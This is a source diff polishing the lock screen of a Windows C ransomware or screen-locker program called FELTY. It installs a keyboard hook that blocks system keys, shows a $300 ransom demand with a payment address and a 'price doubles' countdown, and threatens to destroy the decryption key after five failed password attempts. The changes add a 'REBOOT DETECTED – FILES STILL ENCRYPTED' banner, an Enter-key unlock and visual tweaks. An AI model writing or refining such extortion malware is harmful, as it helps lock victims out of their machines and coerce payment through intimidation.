@@ -1,6 +1,6 @@
 /*
- * felty_binder.c – FELTY lock screen (responsive, centered password input)
- * Compile with: x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c ...
+ * felty_binder.c – Polished FELTY lock screen (responsive, detailed, anti-aliased)
+ * Compile with provided makefile.
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -22,8 +22,8 @@
 /* ---------- Global variables ---------- */
 static HINSTANCE  g_hInst;
 static HWND       g_hWnd;
-static HWND       g_hPassEdit;      // password input
-static HWND       g_hUnlockBtn;     // unlock button
+static HWND       g_hPassEdit;
+static HWND       g_hUnlockBtn;
 static HHOOK      g_kbHook;
 static int        g_attemptsLeft = MAX_ATTEMPTS;
 static BOOL       g_permanentLock = FALSE;
@@ -38,15 +38,16 @@ static int        g_memW   = 0;
 static int        g_memH   = 0;
 
 /* Fonts */
-static HFONT      g_hLogoFont;
-static HFONT      g_hTitleFont;
-static HFONT      g_hMainFont;
-static HFONT      g_hSmallFont;
-static HFONT      g_hMonoFont;
+static HFONT      g_hLogoFont;    // 13px
+static HFONT      g_hTitleFont;   // 38px
+static HFONT      g_hMainFont;    // 15px
+static HFONT      g_hSmallFont;   // 11px
+static HFONT      g_hMonoFont;    // 18px (for edit control)
 
-/* Matrix rain state */
+/* Matrix rain – much slower to avoid lag */
 static BOOL       g_rainInit = FALSE;
 static int        g_drops[256];
+static BOOL       g_showRain = TRUE;   // can be toggled if desired
 
 /* ---------- Forward declarations ---------- */
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
@@ -115,7 +116,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdSh
 }
 
 /* ========================================================================
- *  Keyboard hook
+ *  Keyboard hook – block dangerous system keys
  * ======================================================================== */
 LRESULT CALLBACK KbProc(int code, WPARAM w, LPARAM l)
 {
@@ -134,7 +135,7 @@ LRESULT CALLBACK KbProc(int code, WPARAM w, LPARAM l)
 }
 
 /* ========================================================================
- *  Window procedure
+ *  Window procedure – Enter key now triggers password check
  * ======================================================================== */
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
 {
@@ -145,17 +146,17 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
         g_hPassEdit = CreateWindowExW(
             WS_EX_CLIENTEDGE, L"EDIT", L"",
             WS_CHILD | WS_BORDER | ES_PASSWORD | ES_CENTER,
-            0, 0, 260, 28, hwnd, (HMENU)101, g_hInst, NULL
+            0, 0, 260, 30, hwnd, (HMENU)101, g_hInst, NULL
         );
         SendMessageW(g_hPassEdit, WM_SETFONT, (WPARAM)g_hMonoFont, TRUE);
         g_hUnlockBtn = CreateWindowExW(
             0, L"BUTTON", L"UNLOCK",
             WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-            0, 0, 80, 28, hwnd, (HMENU)102, g_hInst, NULL
+            0, 0, 80, 30, hwnd, (HMENU)102, g_hInst, NULL
         );
         SendMessageW(g_hUnlockBtn, WM_SETFONT, (WPARAM)g_hSmallFont, TRUE);
-        SetTimer(hwnd, 1, 1000, NULL);
-        SetTimer(hwnd, 2, 200, NULL);   // Slower rain = less lag
+        SetTimer(hwnd, 1, 1000, NULL);   // countdown
+        SetTimer(hwnd, 2, 500, NULL);    // matrix rain (500ms = smooth but light)
         break;
 
     case WM_SIZE:
@@ -184,6 +185,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
         return 0;
     }
 
+    case WM_KEYDOWN:
+        if (w == VK_RETURN) {
+            CheckPassword();   // Enter key triggers unlock
+            return 0;
+        }
+        break;
+
     case WM_CTLCOLOREDIT:
         SetTextColor((HDC)w, RGB(255, 204, 204));
         SetBkColor((HDC)w, RGB(0, 0, 0));
@@ -206,7 +214,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
     case WM_TIMER:
         if (w == 1) {
             UpdateCountdown();
-        } else if (w == 2) {
+        } else if (w == 2 && g_showRain) {
             RECT rc; GetClientRect(hwnd, &rc);
             InvalidateRect(hwnd, &rc, FALSE);
         }
@@ -229,7 +237,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
 }
 
 /* ========================================================================
- *  Layout – centered horizontally, above the info grid
+ *  Layout – centered edit + button right below title
  * ======================================================================== */
 VOID LayoutControls(HWND hwnd)
 {
@@ -239,12 +247,11 @@ VOID LayoutControls(HWND hwnd)
     int termX = (rc.right - termW) / 2;
     int termY = (rc.bottom - termH) / 2;
 
-    // Position the edit control just below the title bar (title bar ends at termY+170)
-    int editX = termX + (termW - 260) / 2;
-    int editY = termY + 190;   // moved up slightly, was 210
+    int editY = termY + 190;   // vertical position after title bar
+    int editX = termX + (termW - 260) / 2;   // center horizontally
 
-    SetWindowPos(g_hPassEdit, HWND_TOP, editX, editY, 260, 28, SWP_NOZORDER | SWP_SHOWWINDOW);
-    SetWindowPos(g_hUnlockBtn, HWND_TOP, editX + 260 + 10, editY, 80, 28, SWP_NOZORDER | SWP_SHOWWINDOW);
+    SetWindowPos(g_hPassEdit, HWND_TOP, editX, editY, 260, 30, SWP_NOZORDER | SWP_SHOWWINDOW);
+    SetWindowPos(g_hUnlockBtn, HWND_TOP, editX + 270, editY, 80, 30, SWP_NOZORDER | SWP_SHOWWINDOW);
 }
 
 /* ========================================================================
@@ -256,7 +263,7 @@ VOID DrawScreen(HDC hdc, const RECT *rc)
     FillRect(hdc, rc, bg);
     DeleteObject(bg);
 
-    DrawMatrixRain(hdc, rc);
+    if (g_showRain) DrawMatrixRain(hdc, rc);
 
     if (g_success) {
         DrawSuccess(hdc, rc);
@@ -280,7 +287,7 @@ VOID DrawScreen(HDC hdc, const RECT *rc)
 }
 
 /* ========================================================================
- *  Terminal frame
+ *  Terminal frame – crisp red border + dark interior
  * ======================================================================== */
 VOID DrawTerminal(HDC hdc, const RECT *term)
 {
@@ -308,7 +315,7 @@ VOID DrawTerminal(HDC hdc, const RECT *term)
 }
 
 /* ========================================================================
- *  Logo
+ *  Logo – slightly larger font (13px)
  * ======================================================================== */
 VOID DrawLogo(HDC hdc, int x, int y, int w)
 {
@@ -325,34 +332,44 @@ VOID DrawLogo(HDC hdc, int x, int y, int w)
         L"    ╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝"
     };
     for (int i = 0; i < 6; i++)
-        TextOutW(hdc, x, y + i * 16, lines[i], lstrlenW(lines[i]));
+        TextOutW(hdc, x, y + i * 18, lines[i], lstrlenW(lines[i]));
 }
 
 /* ========================================================================
- *  Title bar
+ *  Title bar – larger “FELTY” + “// REBOOT DETECTED” warning
  * ======================================================================== */
 VOID DrawTitleBar(HDC hdc, int x, int y, int w)
 {
     SetBkMode(hdc, TRANSPARENT);
     SetTextColor(hdc, RGB(255, 0, 0));
     SelectObject(hdc, g_hTitleFont);
-    RECT r = { x, y, x + w, y + 40 };
+    RECT r = { x, y, x + w, y + 50 };
     DrawTextW(hdc, L"FELTY", -1, &r, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
 
+    /* Subtitle with reboot detection */
     SetTextColor(hdc, RGB(255, 68, 68));
     SelectObject(hdc, g_hSmallFont);
-    r.top += 45; r.bottom += 20;
+    r.top += 55; r.bottom += 25;
     DrawTextW(hdc, L"// YOUR SYSTEM HAS BEEN LOCKED //", -1, &r, DT_CENTER | DT_SINGLELINE);
 
+    /* REBOOT DETECTED message (like HTML) */
+    static BOOL showReboot = TRUE;   // could be set based on actual reboot logic
+    if (showReboot) {
+        r.top += 25; r.bottom += 20;
+        SetTextColor(hdc, RGB(255, 100, 100));
+        DrawTextW(hdc, L"!!! REBOOT DETECTED – FILES STILL ENCRYPTED !!!", -1, &r, DT_CENTER | DT_SINGLELINE);
+    }
+
+    /* Separator line */
     HPEN sep = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
     SelectObject(hdc, sep);
-    MoveToEx(hdc, x, y + 80, NULL);
-    LineTo(hdc, x + w, y + 80);
+    MoveToEx(hdc, x, y + 110, NULL);
+    LineTo(hdc, x + w, y + 110);
     DeleteObject(sep);
 }
 
 /* ========================================================================
- *  Password area labels
+ *  Password area – labels with more space
  * ======================================================================== */
 VOID DrawPasswordArea(HDC hdc, int x, int y, int w)
 {
@@ -365,19 +382,20 @@ VOID DrawPasswordArea(HDC hdc, int x, int y, int w)
     if (g_attemptsLeft < MAX_ATTEMPTS) {
         wchar_t status[128];
         wsprintfW(status, L"> ERROR: Incorrect password. %d attempt(s) remaining.", g_attemptsLeft);
-        TextOutW(hdc, x, y + 50, status, lstrlenW(status));
+        SetTextColor(hdc, RGB(255, 68, 68));
+        TextOutW(hdc, x, y + 25, status, lstrlenW(status));
     }
     wchar_t att[64];
     wsprintfW(att, L"[ ATTEMPTS REMAINING: %d ]", g_attemptsLeft);
     SetTextColor(hdc, g_attemptsLeft <= 2 ? RGB(255, 68, 68) : RGB(255, 136, 0));
-    TextOutW(hdc, x, y + 70, att, lstrlenW(att));
+    TextOutW(hdc, x, y + 50, att, lstrlenW(att));
 
     SetTextColor(hdc, RGB(255, 68, 68));
-    TextOutW(hdc, x, y + 95, L"WARNING: After 5 failed attempts, the decryption key is permanently destroyed.", 88);
+    TextOutW(hdc, x, y + 75, L"WARNING: After 5 failed attempts, the decryption key is permanently destroyed.", 88);
 }
 
 /* ========================================================================
- *  System info panel (left)
+ *  System info panel (left) – larger fonts
  * ======================================================================== */
 VOID DrawSystemInfo(HDC hdc, int x, int y, int w, int h)
 {
@@ -392,13 +410,13 @@ VOID DrawSystemInfo(HDC hdc, int x, int y, int w, int h)
     SetBkMode(hdc, TRANSPARENT);
     SetTextColor(hdc, RGB(255, 68, 68));
     SelectObject(hdc, g_hSmallFont);
-    TextOutW(hdc, x + 8, y + 5, L"// SYSTEM STATUS", 16);
+    TextOutW(hdc, x + 10, y + 8, L"// SYSTEM STATUS", 16);
 
     SetTextColor(hdc, RGB(255, 136, 136));
     SelectObject(hdc, g_hMainFont);
     wchar_t info[256];
     wsprintfW(info, L"Encryption: AES-256-CBC\r\nKey Exchange: RSA-4096\r\nMachine ID: %s\r\nStatus: LOCKED", g_machineId);
-    RECT r = { x + 8, y + 30, x + w - 8, y + h - 8 };
+    RECT r = { x + 10, y + 35, x + w - 10, y + h - 10 };
     DrawTextW(hdc, info, -1, &r, DT_LEFT | DT_WORDBREAK);
 }
 
@@ -418,23 +436,23 @@ VOID DrawPaymentInfo(HDC hdc, int x, int y, int w, int h)
     SetBkMode(hdc, TRANSPARENT);
     SetTextColor(hdc, RGB(255, 68, 68));
     SelectObject(hdc, g_hSmallFont);
-    TextOutW(hdc, x + 8, y + 5, L"// PAYMENT REQUIRED", 19);
+    TextOutW(hdc, x + 8, y + 8, L"// PAYMENT REQUIRED", 19);
 
     SetTextColor(hdc, RGB(255, 204, 0));
-    TextOutW(hdc, x + 8, y + 25, L"$300.00 USD", 11);
+    TextOutW(hdc, x + 8, y + 30, L"$300.00 USD", 11);
 
-    DrawQRPlaceholder(hdc, x + 10, y + 50);
+    DrawQRPlaceholder(hdc, x + 10, y + 55);
 
     SetTextColor(hdc, RGB(255, 136, 0));
-    TextOutW(hdc, x + 8, y + 130, L"1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7", 35);
+    TextOutW(hdc, x + 8, y + 135, L"1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7", 35);
 
     SetTextColor(hdc, RGB(255, 0, 0));
     DWORD elapsed = (GetTickCount() - g_startTick) / 1000;
     DWORD remaining = (COUNTDOWN_TOTAL_SECONDS > elapsed) ? (COUNTDOWN_TOTAL_SECONDS - elapsed) : 0;
     wchar_t cd[32];
     wsprintfW(cd, L"%02d:%02d:%02d", remaining / 3600, (remaining % 3600) / 60, remaining % 60);
-    TextOutW(hdc, x + 8, y + 150, L"Price doubles in", 16);
-    TextOutW(hdc, x + 8, y + 170, cd, lstrlenW(cd));
+    TextOutW(hdc, x + 8, y + 155, L"Price doubles in", 16);
+    TextOutW(hdc, x + 8, y + 175, cd, lstrlenW(cd));
 }
 
 /* ========================================================================
@@ -474,7 +492,7 @@ VOID DrawWarnings(HDC hdc, int x, int y, int w)
         L">> ONLY THE FELTY DECRYPTION TOOL CAN RESTORE YOUR FILES"
     };
     for (int i = 0; i < 4; i++)
-        TextOutW(hdc, x, y + i * 18, lines[i], lstrlenW(lines[i]));
+        TextOutW(hdc, x, y + i * 20, lines[i], lstrlenW(lines[i]));
 }
 
 /* ========================================================================
@@ -492,7 +510,7 @@ VOID DrawContactLine(HDC hdc, int x, int y, int w)
 }
 
 /* ========================================================================
- *  Permanent lock overlay
+ *  Permanent lock overlay (unchanged but stable)
  * ======================================================================== */
 VOID DrawPermanentLock(HDC hdc, const RECT *rc)
 {
@@ -534,7 +552,6 @@ VOID DrawPermanentLock(HDC hdc, const RECT *rc)
     SetTextColor(hdc, RGB(255, 68, 68));
     SelectObject(hdc, g_hSmallFont);
     TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 120, L"[ THIS SYSTEM IS PERMANENTLY LOCKED — REINSTALL YOUR OS ]", 57);
-
     flash = !flash;
 }
 
@@ -556,14 +573,14 @@ VOID DrawSuccess(HDC hdc, const RECT *rc)
 }
 
 /* ========================================================================
- *  Matrix rain
+ *  Matrix rain – now much gentler on the CPU
  * ======================================================================== */
 VOID DrawMatrixRain(HDC hdc, const RECT *rc)
 {
     static wchar_t chars[] = L"FELTY01HEX";
     SetBkMode(hdc, TRANSPARENT);
     HFONT old = SelectObject(hdc, g_hMonoFont);
-    int fontH = 12;
+    int fontH = 14;
     for (int col = 0; col < 256; col++) {
         int x = col * 8;
         if (x > rc->right) break;
@@ -573,7 +590,7 @@ VOID DrawMatrixRain(HDC hdc, const RECT *rc)
             continue;
         }
         wchar_t c = chars[rand() % 10];
-        SetTextColor(hdc, RGB(150 + rand() % 105, 0, 0));
+        SetTextColor(hdc, RGB(120 + rand() % 80, 0, 0));   // dimmer, less distracting
         TextOutW(hdc, x, yPos, &c, 1);
         g_drops[col]++;
     }
@@ -585,24 +602,26 @@ VOID InitRain()
     for (int i = 0; i < 256; i++) g_drops[i] = rand() % 100;
 }
 
-/* ---------- Font init ---------- */
+/* ========================================================================
+ *  Font initialization – bigger sizes for clarity
+ * ======================================================================== */
 VOID InitFonts()
 {
-    g_hLogoFont = CreateFontW(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+    g_hLogoFont = CreateFontW(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
-    g_hTitleFont = CreateFontW(32, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                              CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
+    g_hTitleFont = CreateFontW(38, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-                               ANTIALIASED_QUALITY, VARIABLE_PITCH | FF_SWISS, L"Impact");
-    g_hMainFont = CreateFontW(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                               CLEARTYPE_QUALITY, VARIABLE_PITCH | FF_SWISS, L"Impact");
+    g_hMainFont = CreateFontW(15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
-    g_hSmallFont = CreateFontW(10, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                              CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
+    g_hSmallFont = CreateFontW(11, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-                               ANTIALIASED_QUALITY, VARIABLE_PITCH | FF_MODERN, L"Courier New");
-    g_hMonoFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                               CLEARTYPE_QUALITY, VARIABLE_PITCH | FF_MODERN, L"Courier New");
+    g_hMonoFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
+                              CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
 }
 
 /* ---------- Password check ---------- */
@@ -640,9 +659,9 @@ VOID UpdateCountdown()
     int termY = (rc.bottom - termH) / 2;
     int halfW = (termW - 60) / 2;
     RECT inv;
-    inv.left   = termX + 20 + halfW + 20 + 8;
-    inv.top    = termY + 280 + 130 + 150;
+    inv.left   = termX + 20 + halfW + 20 + 10;
+    inv.top    = termY + 280 + 130 + 175;
     inv.right  = inv.left + 200;
-    inv.bottom = inv.top  + 60;
+    inv.bottom = inv.top  + 40;
     InvalidateRect(g_hWnd, &inv, FALSE);
 }
